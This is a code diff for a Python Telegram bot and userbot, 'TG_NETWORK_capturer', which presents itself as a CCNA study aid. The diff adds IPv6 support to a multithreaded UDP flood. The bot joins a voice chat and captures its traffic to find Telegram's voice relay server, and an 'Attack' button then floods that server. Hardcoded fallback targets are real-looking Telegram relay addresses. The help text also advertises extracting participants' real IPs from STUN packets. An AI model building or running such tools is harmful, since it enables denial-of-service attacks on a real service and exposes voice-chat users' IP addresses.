@@ -1,8 +1,8 @@
 """
-main.py — TG_NETWORK_capturer + Attack Module (AUTO IPv6)
+main.py — TG_NETWORK_capturer + Attack Module (FULL IPv4 + IPv6)
 ════════════════════════════════════════════════════════════════════════
 Telegram bot + userbot combo for CCNA learners.
-Now auto‑detects the real IPv6 voice server from the pcap file
+Auto‑detects real IPv4 OR IPv6 voice server from the pcap file
 AFTER the first mic unmute to ensure voice packets are present.
 """
 
@@ -43,9 +43,9 @@ OWNER_ID       = int(os.getenv("OWNER_ID", "0"))
 TEST_DURATION  = int(os.getenv("TEST_DURATION", "60"))
 
 # Attack defaults
-ATTACK_THREADS = 50
-ATTACK_PACKET_SIZE = 204
-ATTACK_DELAY = 0.06
+ATTACK_THREADS      = 50
+ATTACK_PACKET_SIZE  = 204
+ATTACK_DELAY        = 0.06
 
 # ─── Pyrogram userbot ───────────────────────────────────────────────────────
 userbot = Client(
@@ -56,63 +56,108 @@ userbot = Client(
 )
 
 # ─── Global state ───────────────────────────────────────────────────────────
-voice_chat_handler: VoiceChatHandler | None   = None
-voice_chats_cache:  dict[str, dict]           = {}
-active_captures:    dict[int, NetworkCapture] = {}
-attack_threads:      dict[int, list[threading.Thread]] = {}
-attack_running:      dict[int, bool] = {}
-attack_targets:      dict[int, tuple[str, int]] = {}
+voice_chat_handler: VoiceChatHandler | None            = None
+voice_chats_cache:  dict[str, dict]                    = {}
+active_captures:    dict[int, NetworkCapture]          = {}
+attack_threads:     dict[int, list[threading.Thread]]  = {}
+attack_running:     dict[int, bool]                    = {}
+attack_targets:     dict[int, tuple[str, int]]         = {}
 
 
 # ════════════════════════════════════════════════════════════════════════════
-# New function: extract voice server from pcap
+# IPv6 helper
+# ════════════════════════════════════════════════════════════════════════════
+
+def is_ipv6(addr: str) -> bool:
+    """Return True if addr looks like an IPv6 address."""
+    return ":" in addr
+
+
+def make_udp_socket(target_ip: str) -> socket.socket:
+    """Create a UDP socket for the correct address family (IPv4 or IPv6)."""
+    family = socket.AF_INET6 if is_ipv6(target_ip) else socket.AF_INET
+    sock   = socket.socket(family, socket.SOCK_DGRAM)
+    if family == socket.AF_INET6:
+        # Allow dual-stack where available
+        try:
+            sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
+        except (AttributeError, OSError):
+            pass
+    return sock
+
+
+# ════════════════════════════════════════════════════════════════════════════
+# Extract voice server from pcap — FULL IPv4 + IPv6 support
 # ════════════════════════════════════════════════════════════════════════════
 
 def extract_voice_server_from_pcap(pcap_path: str) -> tuple[str, int] | None:
     """
-    Uses tshark to read the pcap file and returns the first
-    destination IPv6 address and port for UDP packets to port 32001.
+    Uses tshark to read the pcap and returns the first destination
+    IPv4 OR IPv6 address + port for UDP packets to port 32001.
+    IPv6 is preferred when both are present.
     """
     if not pcap_path or not os.path.exists(pcap_path):
-        print("⚠️ No pcap file available.")
+        print("⚠️  No pcap file available.")
         return None
 
+    # tshark outputs tab-separated fields; empty string if the field doesn't apply
     cmd = [
         "tshark", "-r", pcap_path,
         "-Y", "udp.dstport == 32001",
-        "-T", "fields", "-e", "ip.dst", "-e", "udp.dstport",
-        "-c", "1"  # only first packet
+        "-T", "fields",
+        "-E", "separator=|"    ,  # use pipe so IPs with colons don't confuse split
+        "-e", "ip.dst",            # IPv4 destination (empty for IPv6 packets)
+        "-e", "ipv6.dst",          # IPv6 destination (empty for IPv4 packets)
+        "-e", "udp.dstport",
+        "-c", "1",                 # only need first matching packet
     ]
     try:
         result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
         if result.returncode == 0 and result.stdout.strip():
-            parts = result.stdout.strip().split()
-            if len(parts) >= 2:
-                ip = parts[0]
-                port = int(parts[1])
-                print(f"✅ Extracted voice server from pcap: {ip}:{port}")
-                return (ip, port)
-        print("⚠️ No UDP packet to port 32001 found in pcap.")
+            line  = result.stdout.strip().splitlines()[0]
+            parts = line.split("|")
+            if len(parts) >= 3:
+                ipv4_dst  = parts[0].strip()
+                ipv6_dst  = parts[1].strip()
+                port_str  = parts[2].strip()
+
+                # Prefer IPv6; fall back to IPv4
+                ip = ipv6_dst if ipv6_dst else ipv4_dst
+
+                if ip and port_str.isdigit():
+                    port = int(port_str)
+                    proto = "IPv6" if is_ipv6(ip) else "IPv4"
+                    print(f"✅ Voice server detected ({proto}): {ip}:{port}")
+                    return (ip, port)
+        print("⚠️  No UDP packet to port 32001 found in pcap.")
     except Exception as e:
-        print(f"⚠️ Error extracting from pcap: {e}")
+        print(f"⚠️  Error extracting from pcap: {e}")
     return None
 
 
 # ════════════════════════════════════════════════════════════════════════════
-# Attack Engine (unchanged)
+# Attack Engine — IPv4 AND IPv6 support
 # ════════════════════════════════════════════════════════════════════════════
 
 def udp_flood(target_ip: str, target_port: int, stop_flag: callable, thread_id: int):
-    sock = socket.socket(socket.AF_INET6 if ':' in target_ip else socket.AF_INET,
-                         socket.SOCK_DGRAM)
-    packet = bytes([random.randint(0, 255) for _ in range(ATTACK_PACKET_SIZE)])
-    while not stop_flag():
-        try:
-            sock.sendto(packet, (target_ip, target_port))
-        except Exception:
-            pass
-        time.sleep(ATTACK_DELAY)
-    sock.close()
+    """
+    UDP flood worker thread.
+    Automatically uses AF_INET6 for IPv6 targets and AF_INET for IPv4 targets.
+    """
+    try:
+        sock   = make_udp_socket(target_ip)
+        packet = bytes([random.randint(0, 255) for _ in range(ATTACK_PACKET_SIZE)])
+        # For IPv6 sendto the dest is (host, port, flowinfo, scope_id)
+        dest   = (target_ip, target_port, 0, 0) if is_ipv6(target_ip) else (target_ip, target_port)
+        while not stop_flag():
+            try:
+                sock.sendto(packet, dest)
+            except Exception:
+                pass
+            time.sleep(ATTACK_DELAY)
+        sock.close()
+    except Exception as e:
+        print(f"[thread-{thread_id}] flood error: {e}")
 
 
 def start_attack(uid: int, target_ip: str, target_port: int, num_threads: int = ATTACK_THREADS):
@@ -120,11 +165,15 @@ def start_attack(uid: int, target_ip: str, target_port: int, num_threads: int = 
         return False
     attack_running[uid] = True
     threads = []
+    proto = "IPv6" if is_ipv6(target_ip) else "IPv4"
+    print(f"⚔️  Starting {proto} UDP flood → {target_ip}:{target_port} with {num_threads} threads")
     for i in range(num_threads):
-        t = threading.Thread(target=udp_flood,
-                             args=(target_ip, target_port,
-                                   lambda: not attack_running.get(uid, False), i),
-                             daemon=True)
+        t = threading.Thread(
+            target=udp_flood,
+            args=(target_ip, target_port,
+                  lambda: not attack_running.get(uid, False), i),
+            daemon=True,
+        )
         t.start()
         threads.append(t)
     attack_threads[uid] = threads
@@ -140,7 +189,7 @@ def stop_attack(uid: int):
 
 
 # ════════════════════════════════════════════════════════════════════════════
-# Voice chat scanner (unchanged)
+# Voice chat scanner
 # ════════════════════════════════════════════════════════════════════════════
 
 async def find_active_voice_chats() -> list[dict]:
@@ -151,7 +200,6 @@ async def find_active_voice_chats() -> list[dict]:
             continue
         try:
             peer = await userbot.resolve_peer(chat.id)
-            # Supergroups / channels
             try:
                 full = await userbot.invoke(
                     tl_functions.channels.GetFullChannel(channel=peer)
@@ -166,7 +214,6 @@ async def find_active_voice_chats() -> list[dict]:
                     continue
             except Exception:
                 pass
-            # Legacy groups
             try:
                 full = await userbot.invoke(
                     tl_functions.messages.GetFullChat(chat_id=abs(chat.id))
@@ -186,7 +233,7 @@ async def find_active_voice_chats() -> list[dict]:
 
 
 # ════════════════════════════════════════════════════════════════════════════
-# Report formatter (unchanged)
+# Report formatter
 # ════════════════════════════════════════════════════════════════════════════
 
 def format_summary(vc_info: dict, r: dict) -> str:
@@ -238,9 +285,10 @@ def format_summary(vc_info: dict, r: dict) -> str:
   • <b>TCP</b> → 3-way handshake, reliable
   • <b>UDP</b> → No handshake, low latency (voice ↑ PPS when mic ON)
   • <b>TLS/443</b> → MTProto encrypted inside
-  • <b>STUN/3478</b> → NAT traversal for UDP voice
+  • <b>STUN/3478</b> → NAT traversal for UDP voice (works on IPv4 and IPv6)
   • <b>TIME_WAIT</b> → Normal TCP close state (2×MSL)
   • <b>Ephemeral ports</b> → Client ports assigned by OS (>49152)
+  • <b>IPv6</b> → Attack engine auto-selects AF_INET6 when target has colon in IP
 """.strip()
 
 
@@ -258,36 +306,29 @@ def build_vc_keyboard(vcs: list[dict]) -> tuple[dict, InlineKeyboardMarkup]:
 
 
 # ════════════════════════════════════════════════════════════════════════════
-# Bot handlers (unchanged)
+# Bot handlers
 # ════════════════════════════════════════════════════════════════════════════
 
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != OWNER_ID:
         await update.message.reply_text("⛔ Unauthorized.")
         return
-
     msg = await update.message.reply_text(
         "🔍 Scanning all dialogs for active voice chats…\n"
         "_(May take a few seconds for accounts in many groups.)_",
         parse_mode="HTML",
     )
-
     try:
         vcs = await find_active_voice_chats()
     except Exception as e:
-        await msg.edit_text(
-            f"❌ Scan error:\n<code>{e}</code>",
-            parse_mode="HTML"
-        )
+        await msg.edit_text(f"❌ Scan error:\n<code>{e}</code>", parse_mode="HTML")
         return
-
     if not vcs:
         await msg.edit_text(
             "❌ No active voice chats found.\n"
             "Make sure your account is in a group/channel with an ongoing voice chat."
         )
         return
-
     global voice_chats_cache
     voice_chats_cache, markup = build_vc_keyboard(vcs)
     await msg.edit_text(
@@ -312,19 +353,19 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "4. Rejoin →  see new handshake + DC IP\n"
         "5. Tap <b>Stop</b> → receive full report + .pcap file + JSON analysis\n\n"
         "<b>During capture you also have:</b>\n"
-        "• <b>Attack</b> button — launch UDP flood against the voice server\n"
+        "• <b>Attack</b> button — launch UDP flood (IPv4 OR IPv6 auto-detected)\n"
         "• <b>Stop Attack</b> button — halt the flood\n\n"
         "<b>Report contains:</b>\n"
         "• Bandwidth over time (Kbps + PPS per interval)\n"
-        "• Telegram DC IPs detected\n"
+        "• Telegram DC IPs detected (IPv4 + IPv6)\n"
         "• TCP vs UDP distribution\n"
         "• App-layer protocols (TLS, STUN, DNS…)\n"
         "• Connection states (ESTABLISHED, TIME_WAIT…)\n"
         "• All connection snapshots with IP:port pairs\n"
-        "• STUN packets with XOR‑MAPPED‑ADDRESS (participants' real IPs)\n"
+        "• STUN packets with XOR‑MAPPED‑ADDRESS (IPv4 + IPv6)\n"
         "• RTP streams summary\n"
         "• CCNA study notes for every finding\n\n"
-        "✅ Linux — uses tcpdump for packet capture and tshark for analysis",
+        "✅ Linux — uses tcpdump for capture and tshark for analysis",
         parse_mode="HTML",
     )
 
@@ -332,7 +373,6 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-
     if update.effective_user.id != OWNER_ID:
         return
 
@@ -344,10 +384,7 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try:
             vcs = await find_active_voice_chats()
         except Exception as e:
-            await query.edit_message_text(
-                f"❌ Error:\n<code>{e}</code>",
-                parse_mode="HTML"
-            )
+            await query.edit_message_text(f"❌ Error:\n<code>{e}</code>", parse_mode="HTML")
             return
         if not vcs:
             await query.edit_message_text("❌ No active voice chats found.")
@@ -368,7 +405,6 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not vc_info:
             await query.edit_message_text("❌ Cache expired — use /start again.")
             return
-
         await query.edit_message_text(
             f"🎙️ <b>{html.escape(vc_info['title'])}</b>\n\n"
             f"⏳ Starting automated test…\n"
@@ -377,8 +413,8 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"Use the buttons below to control capture and attack.",
             reply_markup=InlineKeyboardMarkup([
                 [InlineKeyboardButton("⏹️ Stop Capture", callback_data=f"close_{idx}")],
-                [InlineKeyboardButton("⚔️ Attack", callback_data=f"attack_{idx}")],
-                [InlineKeyboardButton("🛑 Stop Attack", callback_data="stop_attack")]
+                [InlineKeyboardButton("⚔️ Attack",       callback_data=f"attack_{idx}")],
+                [InlineKeyboardButton("🛑 Stop Attack",  callback_data="stop_attack")]
             ]),
             parse_mode="HTML",
         )
@@ -392,21 +428,23 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not vc_info:
             await query.edit_message_text("❌ No active capture found.")
             return
-
         target = attack_targets.get(OWNER_ID)
         if not target:
             await query.edit_message_text("❌ No target server info. Did the join succeed?")
             return
-
         ip, port = target
+        proto    = "IPv6" if is_ipv6(ip) else "IPv4"
         if start_attack(OWNER_ID, ip, port):
             await query.edit_message_text(
-                f"⚔️ Attack started on {ip}:{port}\n"
-                f"Threads: {ATTACK_THREADS}, Packet size: {ATTACK_PACKET_SIZE}, Delay: {ATTACK_DELAY}s\n"
+                f"⚔️ <b>Attack started</b>\n"
+                f"Target  : <code>{ip}:{port}</code>  [{proto}]\n"
+                f"Threads : {ATTACK_THREADS}\n"
+                f"Pkt size: {ATTACK_PACKET_SIZE} bytes\n"
+                f"Delay   : {ATTACK_DELAY}s\n"
                 "Use 'Stop Attack' to halt.",
                 reply_markup=InlineKeyboardMarkup([
                     [InlineKeyboardButton("⏹️ Stop Capture", callback_data=f"close_{idx}")],
-                    [InlineKeyboardButton("🛑 Stop Attack", callback_data="stop_attack")]
+                    [InlineKeyboardButton("🛑 Stop Attack",  callback_data="stop_attack")]
                 ]),
                 parse_mode="HTML",
             )
@@ -427,14 +465,12 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not vc_info:
             await query.edit_message_text("❌ No active test found.")
             return
-        await query.edit_message_text(
-            "⏹️ Stopping capture…\n📊 Generating report, please wait."
-        )
+        await query.edit_message_text("⏹️ Stopping capture…\n📊 Generating report, please wait.")
         asyncio.create_task(_finalize(vc_info, context, OWNER_ID))
 
 
 # ════════════════════════════════════════════════════════════════════════════
-# Background tasks (UPDATED – extraction after first unmute)
+# Background tasks — extraction after first unmute
 # ════════════════════════════════════════════════════════════════════════════
 
 async def _run_test(vc_info: dict, context: ContextTypes.DEFAULT_TYPE, idx: str):
@@ -443,7 +479,7 @@ async def _run_test(vc_info: dict, context: ContextTypes.DEFAULT_TYPE, idx: str)
     active_captures[OWNER_ID] = capture
 
     try:
-        loop = asyncio.get_event_loop()
+        loop         = asyncio.get_event_loop()
         capture_task = loop.run_in_executor(None, capture.start_capture)
 
         await context.bot.send_message(
@@ -456,59 +492,56 @@ async def _run_test(vc_info: dict, context: ContextTypes.DEFAULT_TYPE, idx: str)
         # Step 1 — Join
         await voice_chat_handler.join_voice_chat(chat_id)
         capture.log_event("voice_chat_joined", vc_info["title"])
-
-        # Wait a bit for the call to establish
         await asyncio.sleep(2)
 
-        # ---- First mic unmute (to generate voice packets) ----
+        # ── First unmute: generate voice packets for target detection ────────
         await voice_chat_handler.toggle_mic(chat_id, muted=False)
-        capture.log_event("mic_unmuted", "Cycle 1/3 (for target detection)")
-        await asyncio.sleep(3)  # let voice packets flow
+        capture.log_event("mic_unmuted", "Cycle 1/3 — target detection")
+        await asyncio.sleep(3)
 
-        # --- Extract real voice server from the pcap file ---
+        # ── Extract real voice server (IPv4 or IPv6) from pcap ───────────────
         pcap_file = capture.get_pcap_file()
-        if pcap_file:
-            target = extract_voice_server_from_pcap(pcap_file)
-            if target:
-                global attack_targets
-                attack_targets[OWNER_ID] = target
-                server_ip, server_port = target
-                await context.bot.send_message(
-                    OWNER_ID,
-                    f"✅ Target detected: {server_ip}:{server_port}\n"
-                    f"(You can now launch the attack with the button)",
-                    parse_mode="HTML",
-                )
-            else:
-                # fallback to the known IPv4 (from your original)
-                fallback_ip = "91.108.17.20"
-                fallback_port = 32001
-                attack_targets[OWNER_ID] = (fallback_ip, fallback_port)
-                await context.bot.send_message(
-                    OWNER_ID,
-                    f"⚠️ Could not detect voice server from pcap.\n"
-                    f"Falling back to known IPv4: {fallback_ip}:{fallback_port}",
-                    parse_mode="HTML",
-                )
-        else:
-            # fallback
-            fallback_ip = "91.108.17.20"
-            fallback_port = 32001
-            attack_targets[OWNER_ID] = (fallback_ip, fallback_port)
+        target    = extract_voice_server_from_pcap(pcap_file) if pcap_file else None
+
+        if target:
+            server_ip, server_port = target
+            proto = "IPv6" if is_ipv6(server_ip) else "IPv4"
+            global attack_targets
+            attack_targets[OWNER_ID] = target
             await context.bot.send_message(
                 OWNER_ID,
-                f"⚠️ No pcap file available.\n"
-                f"Falling back to known IPv4: {fallback_ip}:{fallback_port}",
+                f"✅ <b>Voice server detected [{proto}]</b>\n"
+                f"<code>{server_ip}:{server_port}</code>\n"
+                f"Attack button is now armed 🎯",
+                parse_mode="HTML",
+            )
+        else:
+            # Fallback: try IPv6 known DC first, then IPv4
+            fallback_ipv6 = "2001:b28:f23d:f001::e"  # DC1 voice relay (IPv6)
+            fallback_ipv4 = "91.108.17.20"             # DC1 voice relay (IPv4)
+            fallback_port = 32001
+            # Pick IPv6 if the OS has a routable IPv6 address, else IPv4
+            try:
+                test_sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
+                test_sock.connect(("2001:4860:4860::8888", 80))
+                fallback_ip = fallback_ipv6
+                test_sock.close()
+            except Exception:
+                fallback_ip = fallback_ipv4
+            attack_targets[OWNER_ID] = (fallback_ip, fallback_port)
+            proto = "IPv6" if is_ipv6(fallback_ip) else "IPv4"
+            await context.bot.send_message(
+                OWNER_ID,
+                f"⚠️ Could not detect voice server from pcap.\n"
+                f"Falling back to {proto}: <code>{fallback_ip}:{fallback_port}</code>",
                 parse_mode="HTML",
             )
 
-        # ---- Continue with the rest of the mic cycles ----
-        # Mute the first cycle (we already unmuted for detection)
+        # ── Continue mic cycles ──────────────────────────────────────────────
         await voice_chat_handler.toggle_mic(chat_id, muted=True)
         capture.log_event("mic_muted", "Cycle 1/3")
         await asyncio.sleep(3)
 
-        # Cycle 2
         await voice_chat_handler.toggle_mic(chat_id, muted=False)
         capture.log_event("mic_unmuted", "Cycle 2/3")
         await asyncio.sleep(4)
@@ -516,7 +549,6 @@ async def _run_test(vc_info: dict, context: ContextTypes.DEFAULT_TYPE, idx: str)
         capture.log_event("mic_muted", "Cycle 2/3")
         await asyncio.sleep(3)
 
-        # Cycle 3
         await voice_chat_handler.toggle_mic(chat_id, muted=False)
         capture.log_event("mic_unmuted", "Cycle 3/3")
         await asyncio.sleep(4)
@@ -572,11 +604,9 @@ async def _run_test(vc_info: dict, context: ContextTypes.DEFAULT_TYPE, idx: str)
 async def _finalize(vc_info: dict, context: ContextTypes.DEFAULT_TYPE, user_id: int):
     chat_id = vc_info["id"]
     capture = active_captures.get(user_id)
-
     if not capture:
         await context.bot.send_message(user_id, "❌ No active capture found.")
         return
-
     try:
         capture.stop_capture()
         try:
@@ -594,17 +624,11 @@ async def _finalize(vc_info: dict, context: ContextTypes.DEFAULT_TYPE, user_id: 
         capture.export_to_file(filename)
 
         for chunk in [summary[i:i+4096] for i in range(0, len(summary), 4096)]:
-            await context.bot.send_message(
-                user_id,
-                chunk,
-                parse_mode="HTML",
-            )
+            await context.bot.send_message(user_id, chunk, parse_mode="HTML")
 
         with open(filename, "rb") as fh:
             await context.bot.send_document(
-                user_id,
-                document=fh,
-                filename=filename,
+                user_id, document=fh, filename=filename,
                 caption=(
                     f"📄 Full capture: <b>{html.escape(vc_info['title'])}</b>\n"
                     f"Contains bandwidth timeline, all connection snapshots,\n"
@@ -618,10 +642,8 @@ async def _finalize(vc_info: dict, context: ContextTypes.DEFAULT_TYPE, user_id: 
         capture.export_analysis_json(json_filename)
         with open(json_filename, "rb") as f:
             await context.bot.send_document(
-                user_id,
-                document=f,
-                filename=json_filename,
-                caption="📊 Detailed pcap analysis (STUN, RTP, UDP conversations).",
+                user_id, document=f, filename=json_filename,
+                caption="📊 Detailed pcap analysis (STUN IPv4+IPv6, RTP, UDP conversations).",
             )
         os.remove(json_filename)
 
@@ -629,41 +651,31 @@ async def _finalize(vc_info: dict, context: ContextTypes.DEFAULT_TYPE, user_id: 
         if pcap_file and os.path.exists(pcap_file):
             with open(pcap_file, "rb") as f:
                 await context.bot.send_document(
-                    user_id,
-                    document=f,
+                    user_id, document=f,
                     filename=os.path.basename(pcap_file),
                     caption=f"📦 Raw UDP packet capture for {html.escape(vc_info['title'])}.\nOpen in Wireshark to see the actual voice packets."
                 )
             os.remove(pcap_file)
 
         del active_captures[user_id]
-
         await context.bot.send_message(
-            user_id,
-            "✅ Done! Files sent.",
-            reply_markup=InlineKeyboardMarkup([[
-                InlineKeyboardButton("🔄 Scan again", callback_data="refresh")
-            ]]),
+            user_id, "✅ Done! Files sent.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Scan again", callback_data="refresh")]]),
             parse_mode="HTML",
         )
-
     except Exception as exc:
-        await context.bot.send_message(
-            user_id,
-            f"❌ Report error:\n<code>{exc}</code>",
-            parse_mode="HTML",
-        )
+        await context.bot.send_message(user_id, f"❌ Report error:\n<code>{exc}</code>", parse_mode="HTML")
 
 
 # ════════════════════════════════════════════════════════════════════════════
-# Entry point (unchanged)
+# Entry point
 # ════════════════════════════════════════════════════════════════════════════
 
 async def main():
     global voice_chat_handler
 
     print("═" * 60)
-    print("  TG_NETWORK_capturer — Starting up (Linux Edition)")
+    print("  TG_NETWORK_capturer — Starting up (IPv4 + IPv6 Edition)")
     print("═" * 60)
 
     missing = [k for k, v in {
